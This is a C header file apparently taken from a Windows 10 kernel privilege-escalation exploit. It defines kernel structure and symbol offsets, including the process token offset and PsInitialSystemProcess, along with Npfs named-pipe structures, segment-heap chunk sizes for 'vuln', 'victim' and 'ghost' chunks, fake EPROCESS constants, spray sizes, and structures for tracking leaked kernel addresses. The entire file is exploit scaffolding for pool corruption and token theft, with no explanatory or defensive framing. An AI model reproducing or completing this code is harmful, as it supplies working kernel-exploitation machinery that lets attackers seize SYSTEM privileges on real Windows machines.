#ifndef COMMON_H
#define COMMON_H

#include <windows.h>

#define SYSTEM_PID 0x4

// Kernel structure offsets
#define EPROCESS_TYPE_OFFSET 0x0
#define EPROCESS_KTHREAD_OFFSET 0x30
#define EPROCESS_UNIQUE_PROCESS_ID_OFFSET 0x440
#define EPROCESS_ACTIVE_PROCESS_LINKS_OFFSET 0x448
#define EPROCESS_TOKEN_OFFSET 0x4B8
#define EPROCESS_QUOTA_BLOCK_OFFSET 0x568
#define KTHREAD_PREVIOUS_MODE_OFFSET 0x232
#define KTHREAD_THREAD_LIST_ENTRY 0x2F8

// Kernel function and variable offsets
#define nt_PsInitialSystemProcess_OFFSET 0xCFC420
#define nt_ExAllocatePoolWithTag_OFFSET 0x9B8010
#define nt_ExpPoolQuotaCookie_OFFSET 0xCFC9E8
#define nt_RtlpHpHeapGlobals_OFFSET 0xC1DD40
#define Npfs_imp_ExAllocatePoolWithTag_OFFSET 0x7050

// Npfs.sys structure offsets
// ref: https://github.com/reactos/reactos/blob/c2c66af/drivers/filesystems/npfs/npfs.h#L258
#define NP_CCB_DataQueue_OFFSET 0x48
#define NP_CCB_FileObject_OFFSET 0x30

// Pool chunk constants
#define PIPE_QUEUE_ENTRY_BUFSIZE(block_size) (block_size - sizeof(POOL_HEADER) - sizeof(NP_DATA_QUEUE_ENTRY))
#define VULN_BLOCK_SIZE 0x200
#define VICTIM_BLOCK_SIZE 0x210
#define GHOST_BLOCK_SIZE 0x370
#define PREV_CHUNK_OFFSET (sizeof(HEAP_VS_CHUNK_HEADER) + sizeof(POOL_HEADER) + sizeof(NP_DATA_QUEUE_ENTRY))
#define NEXT_CHUNK_OFFSET ((sizeof(HEAP_VS_CHUNK_HEADER) + VICTIM_BLOCK_SIZE) * 2 - PREV_CHUNK_OFFSET)

// Fake eprocess constants
#define FAKE_EPROCESS_SIZE 0x800
#define FAKE_EPROCESS_OFFSET 0x50

// Spray constants
#define SPRAY_SIZE 0x80 * 10

// Kernel structures
// ref: https://www.vergiliusproject.com/kernels/x64/windows-10/22h2/_HEAP_VS_CHUNK_HEADER
typedef struct _HEAP_VS_CHUNK_HEADER
{
    uint16_t MemoryCost;
    uint16_t UnsafeSize;
    uint16_t UnsafePrevSize;
    uint8_t Allocated;
    uint8_t Unused1;
    uint8_t EncodedSegmentPageOffset;
    uint8_t Unused2[7];
} HEAP_VS_CHUNK_HEADER;
static_assert(sizeof(HEAP_VS_CHUNK_HEADER) == 0x10, "HEAP_VS_CHUNK_HEADER must be 0x10 bytes");

// ref: https://www.vergiliusproject.com/kernels/x64/windows-10/22h2/_POOL_HEADER
typedef struct _POOL_HEADER
{
    uint8_t PreviousSize;
    uint8_t PoolIndex;
    uint8_t BlockSize;
    uint8_t PoolType;
    uint32_t PoolTag;
    uintptr_t ProcessBilled;
} POOL_HEADER;
static_assert(sizeof(POOL_HEADER) == 0x10, "POOL_HEADER must be 0x10 bytes");

// ref: https://github.com/reactos/reactos/blob/c2c66af/drivers/filesystems/npfs/npfs.h#L148
typedef struct _NP_DATA_QUEUE_ENTRY
{
    LIST_ENTRY QueueEntry;
    uintptr_t Irp;
    uintptr_t ClientSecurityContext;
    unsigned long DataEntryType;
    unsigned long QuotaInEntry;
    unsigned long DataSize;
    unsigned long unknown;
    char data[0];
} NP_DATA_QUEUE_ENTRY;
static_assert(sizeof(NP_DATA_QUEUE_ENTRY) == 0x30, "NP_DATA_QUEUE_ENTRY must be 0x30 bytes");

// ref: https://www.vergiliusproject.com/kernels/x64/windows-10/22h2/_IRP
typedef struct _IRP
{
    uint64_t Unused[3];
    uint64_t SystemBuffer;
} IRP;

// Exploit structures
typedef struct vs_chunk
{
    uintptr_t encoded_vs_header[2];
    POOL_HEADER pool_header;
    NP_DATA_QUEUE_ENTRY np_data_queue_entry;
} vs_chunk_t;

typedef struct pipe_pair
{
    HANDLE write;
    HANDLE read;
} pipe_pair_t;

typedef struct pipe_group
{
    size_t nb;
    size_t block_size;
    pipe_pair_t pipes[1];
} pipe_group_t;

typedef struct exploit_pipes
{
    pipe_pair_t ghost_chunk_pipe;
    pipe_pair_t previous_chunk_pipe;
} exploit_pipes_t;

typedef struct exploit_addresses
{
    uintptr_t ghost_vs_chunk;
    uintptr_t np_cbb_data_queue;

    uintptr_t kernel_base;
    uintptr_t ExpPoolQuotaCookie;
    uintptr_t RtlpHpHeapGlobals;
    uintptr_t system_eprocess;
    uintptr_t self_eprocess;
    uintptr_t self_kthread;
} exploit_addresses_t;

#endif // COMMON_H
